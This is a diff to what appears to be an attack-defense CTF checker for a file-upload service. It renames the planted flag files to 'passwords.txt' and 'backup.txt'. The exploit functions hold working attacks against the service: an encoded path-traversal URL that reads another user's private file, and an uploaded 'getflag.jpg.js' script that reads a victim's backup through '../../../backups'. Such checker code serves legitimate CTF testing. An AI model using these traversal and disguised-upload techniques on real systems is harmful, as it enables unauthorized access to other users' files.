@@ -115,10 +115,10 @@ async def putflag_private(task: PutflagCheckerTaskMessage, client: AsyncClient, 
     await db.set("userinfo", (email, password) )
 
     # create a .txt file containing the flag and upload it to /files/private
-    with open('flag.txt', 'w') as flagFile:
+    with open('passwords.txt', 'w') as flagFile:
         flagFile.write(task.flag)
 
-    uploadResp = await client.post('/files/private', files={"privateFile": open('flag.txt', 'rb')}, cookies={"jwtToken": cookie})
+    uploadResp = await client.post('/files/private', files={"privateFile": open('passwords.txt', 'rb')}, cookies={"jwtToken": cookie})
     assert_equals(uploadResp.status_code, 302, "couln't store flag under /files/private")
 
     return userId
@@ -132,10 +132,10 @@ async def putflag_backup(task: PutflagCheckerTaskMessage, client: AsyncClient, d
     await db.set("userinfo", (email, password) )
 
     # create a .txt file containing the flag and upload it to /files/backup
-    with open('flag.txt', 'w') as flagFile:
+    with open('backup.txt', 'w') as flagFile:
         flagFile.write(task.flag)
 
-    uploadResp = await client.post('/files/backup', files={"backupFile": open('flag.txt', 'rb')}, cookies={"jwtToken": cookie})
+    uploadResp = await client.post('/files/backup', files={"backupFile": open('backup.txt', 'rb')}, cookies={"jwtToken": cookie})
     assert_equals(uploadResp.status_code, 302, "couln't store flag under /files/backup")
 
     return userId
@@ -221,7 +221,7 @@ async def getflag_private(task: GetflagCheckerTaskMessage, client: AsyncClient, 
     userId, cookie = await login(email, password, client)
     
     # visit the users private upload directory to find the flag 
-    flagResp = await client.get(f"/uploads/{base64.b64encode(userId.encode()).decode()}/private/flag.txt", cookies={"jwtToken": cookie})
+    flagResp = await client.get(f"/uploads/{base64.b64encode(userId.encode()).decode()}/private/passwords.txt", cookies={"jwtToken": cookie})
     assert_equals(flagResp.status_code, 200, "couldn't retrieve the flag from private directory")
     assert_in(task.flag, flagResp.text, "flag not found in private directory")
 
@@ -239,7 +239,7 @@ async def getflag_backup(task: GetflagCheckerTaskMessage, client: AsyncClient, d
     userId, cookie = await login(email, password, client)
     
     # visit the users backup directory to retrieve the flag
-    flagResp = await client.get(f"/files/retrieve/{base64.b64encode(userId.encode()).decode()}/flag.txt", cookies={"jwtToken": cookie})
+    flagResp = await client.get(f"/files/retrieve/{base64.b64encode(userId.encode()).decode()}/backup.txt", cookies={"jwtToken": cookie})
     assert_equals(flagResp.status_code, 200, "couldn't retrieve the flag from backup directory")
     assert_in(task.flag, flagResp.text, "flag not found in backup directory")
 
@@ -353,7 +353,7 @@ async def exploit_private(task: ExploitCheckerTaskMessage, searcher: FlagSearche
     email, password, cookie, userId = await register(client)
 
     # exploit
-    flagResp = await client.get(f"/uploads/{base64.b64encode(victimUserId.encode()).decode()}%2Fpublic%2F..%2Fprivate%2Fflag.txt", cookies={"jwtToken": cookie})
+    flagResp = await client.get(f"/uploads/{base64.b64encode(victimUserId.encode()).decode()}%2Fpublic%2F..%2Fprivate%2Fpasswords.txt", cookies={"jwtToken": cookie})
     assert_equals(flagResp.status_code, 200, "couldn't load flag from private directory")
 
     # retrieve and return the flag
@@ -376,7 +376,7 @@ async def exploit_backup(task: ExploitCheckerTaskMessage, searcher: FlagSearcher
     with open('getflag.jpg.js', 'w') as getFlag:
         getFlag.write(f"""const fs = require('fs');
                             const path = require('path'); 
-                            const flagPath = path.join(__dirname, '../../../backups', '{base64.b64encode(victimUserId.encode()).decode()}', 'flag.txt');
+                            const flagPath = path.join(__dirname, '../../../backups', '{base64.b64encode(victimUserId.encode()).decode()}', 'backup.txt');
                             function readFlagFile() {{
                                 try {{
                                     const flag = fs.readFileSync(flagPath, 'utf8');
